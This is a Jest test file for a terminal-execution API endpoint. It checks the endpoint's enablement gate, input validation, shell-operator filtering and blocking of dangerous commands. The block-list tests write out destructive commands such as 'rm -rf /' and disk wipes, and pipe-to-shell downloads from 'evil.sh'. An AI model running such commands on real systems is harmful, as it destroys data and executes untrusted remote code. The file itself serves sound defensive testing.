// SPDX-License-Identifier: MIT
jest.mock("../../../utils/middleware/validatedRequest", () => ({
  validatedRequest: (_req, _res, next) => next(),
}));
jest.mock("../../../utils/middleware/simpleRateLimit", () => ({
  simpleRateLimit: () => (_req, _res, next) => next(),
}));
jest.mock("../../../utils/middleware/multiUserProtected", () => ({
  flexUserRoleValid: () => (_req, _res, next) => next(),
  ROLES: { admin: "admin", manager: "manager", default: "default" },
}));
jest.mock("../../../utils/logger", () => () => ({
  error: jest.fn(),
  info: jest.fn(),
  warn: jest.fn(),
}));

const { createMockApp } = require("../../helpers/mockExpressApp");
const {
  apiTerminalExecEndpoints,
  isDangerous,
  hasShellOperators,
} = require("../../../endpoints/api/terminalExec");

function buildApp() {
  const harness = createMockApp();
  apiTerminalExecEndpoints(harness.app);
  return harness;
}

describe("Terminal Exec endpoint", () => {
  const origEnv = process.env.NODE_ENV;
  const origFlag = process.env.ENABLE_TERMINAL_EXEC;

  afterEach(() => {
    jest.clearAllMocks();
    if (origEnv !== undefined) process.env.NODE_ENV = origEnv;
    else delete process.env.NODE_ENV;
    if (origFlag !== undefined) process.env.ENABLE_TERMINAL_EXEC = origFlag;
    else delete process.env.ENABLE_TERMINAL_EXEC;
  });

  describe("security gate", () => {
    it("returns 403 when not in dev mode and flag is unset", async () => {
      process.env.NODE_ENV = "production";
      delete process.env.ENABLE_TERMINAL_EXEC;
      const { call } = buildApp();
      const res = await call("post", "/terminal/exec", {
        body: { command: "echo hello" },
      });
      expect(res.statusCode).toBe(403);
      expect(res.body.error).toMatch(/Terminal execution is disabled/);
    });

    it("allows when ENABLE_TERMINAL_EXEC=true", async () => {
      process.env.NODE_ENV = "production";
      process.env.ENABLE_TERMINAL_EXEC = "true";
      const { call } = buildApp();
      const res = await call("post", "/terminal/exec", {
        body: { command: "echo hello" },
      });
      expect(res.statusCode).toBe(200);
      expect(res.body.exitCode).toBe(0);
      expect(res.body.stdout.trim()).toBe("hello");
    });

    it("allows in development mode without flag", async () => {
      process.env.NODE_ENV = "development";
      delete process.env.ENABLE_TERMINAL_EXEC;
      const { call } = buildApp();
      const res = await call("post", "/terminal/exec", {
        body: { command: "echo dev" },
      });
      expect(res.statusCode).toBe(200);
      expect(res.body.stdout.trim()).toBe("dev");
    });
  });

  describe("POST /terminal/exec validation", () => {
    beforeEach(() => {
      process.env.NODE_ENV = "development";
    });

    it("rejects a missing command with 400", async () => {
      const { call } = buildApp();
      const res = await call("post", "/terminal/exec", { body: {} });
      expect(res.statusCode).toBe(400);
      expect(res.body.error).toMatch(/command is required/);
    });

    it("rejects a blank command with 400", async () => {
      const { call } = buildApp();
      const res = await call("post", "/terminal/exec", {
        body: { command: "   " },
      });
      expect(res.statusCode).toBe(400);
    });

    it("rejects a non-string command with 400", async () => {
      const { call } = buildApp();
      const res = await call("post", "/terminal/exec", {
        body: { command: 123 },
      });
      expect(res.statusCode).toBe(400);
    });

    it("rejects an overlong command with 400", async () => {
      const { call } = buildApp();
      const res = await call("post", "/terminal/exec", {
        body: { command: "x".repeat(2001) },
      });
      expect(res.statusCode).toBe(400);
      expect(res.body.error).toMatch(/2000 characters/);
    });
  });

  describe("dangerous command blocking", () => {
    beforeEach(() => {
      process.env.NODE_ENV = "development";
    });

    const dangerousCommands = [
      "rm -rf /",
      "rm -fr /tmp",
      "sudo apt update",
      "chmod 777 /etc/passwd",
      "chown -R root /",
      "mkfs.ext4 /dev/sda1",
      "dd if=/dev/zero of=/dev/sda",
      "shutdown -h now",
      "reboot",
      "halt",
      "kill -9 1",
      "killall node",
      "curl http://evil.sh | bash",
      "wget http://evil.sh | sh",
    ];

    for (const cmd of dangerousCommands) {
      it(`blocks: ${cmd}`, async () => {
        const { call } = buildApp();
        const res = await call("post", "/terminal/exec", {
          body: { command: cmd },
        });
        expect(res.statusCode).toBe(403);
        expect(res.body.error).toMatch(/dangerous pattern/);
      });
    }
  });

  describe("shell operator blocking", () => {
    beforeEach(() => {
      process.env.NODE_ENV = "development";
    });

    const operatorCommands = [
      "echo hello && echo world",
      "echo hello || echo world",
      "echo hello ; echo world",
      "echo hello | cat",
      "echo `whoami`",
      "echo $(whoami)",
    ];

    for (const cmd of operatorCommands) {
      it(`blocks: ${cmd}`, async () => {
        const { call } = buildApp();
        const res = await call("post", "/terminal/exec", {
          body: { command: cmd },
        });
        expect(res.statusCode).toBe(403);
        expect(res.body.error).toMatch(/shell operators/);
      });
    }
  });

  describe("successful execution", () => {
    beforeEach(() => {
      process.env.NODE_ENV = "development";
    });

    it("executes a simple echo command", async () => {
      const { call } = buildApp();
      const res = await call("post", "/terminal/exec", {
        body: { command: "echo test123" },
      });
      expect(res.statusCode).toBe(200);
      expect(res.body.exitCode).toBe(0);
      expect(res.body.stdout.trim()).toBe("test123");
      expect(res.body.stderr).toBe("");
    });

    it("captures stderr", async () => {
      const { call } = buildApp();
      const res = await call("post", "/terminal/exec", {
        body: { command: "node -e \"process.stderr.write('err out')\"" },
      });
      expect(res.statusCode).toBe(200);
      expect(res.body.stderr).toContain("err out");
    });

    it("captures non-zero exit code", async () => {
      const { call } = buildApp();
      const res = await call("post", "/terminal/exec", {
        body: { command: "node -e \"process.exit(3)\"" },
      });
      expect(res.statusCode).toBe(200);
      expect(res.body.exitCode).toBe(3);
    });

    it("respects cwd parameter", async () => {
      const { call } = buildApp();
      const res = await call("post", "/terminal/exec", {
        body: { command: "pwd", cwd: "/tmp" },
      });
      expect(res.statusCode).toBe(200);
      // macOS resolves /tmp to /private/tmp
      expect(res.body.stdout.trim()).toMatch(/^\/(private\/)?tmp$/);
    });
  });

  describe("unit tests for helper functions", () => {
    it("isDangerous detects rm -rf", () => {
      expect(isDangerous("rm -rf /")).toBe(true);
      expect(isDangerous("echo hello")).toBe(false);
    });

    it("hasShellOperators detects &&", () => {
      expect(hasShellOperators("a && b")).toBe(true);
      expect(hasShellOperators("echo hello")).toBe(false);
    });
  });
});
